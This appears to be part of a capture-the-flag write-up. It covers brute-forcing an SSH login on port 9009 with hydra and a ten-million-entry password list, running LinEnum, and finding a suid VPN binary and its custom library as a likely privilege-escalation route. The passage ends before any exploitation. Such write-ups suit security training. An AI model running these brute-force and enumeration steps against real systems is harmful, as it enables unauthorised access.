Port 9009 is an SSH port. The banner indicates the user needs to login as admin. Not seeing any other information, the best approach seemded to be to attempt at password guessing given we have a fixed username and endpoint. This was done with hydra which yeiled the password as `password`

```bash
hydra -s 9009 -v -l $USER -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -e nsr -t 4 $TARGET ssh
```

Nothing obvious on the machine. SCP'd LinEnum over to the macine to run because the box has no inet access.

Interesting suid file found:
* ```-rwsr-xr-x 1 root admin 16064 Dec  1 14:57 /opt/vpn_connect```


Searching for the lib
```bash
admin@d3cee63adf29:/tmp$ find / -name "libvpnauthcustom.so" 2>/dev/null
/usr/lib/libvpnauthcustom.so
admin@d3cee63adf29:/tmp$ 
```

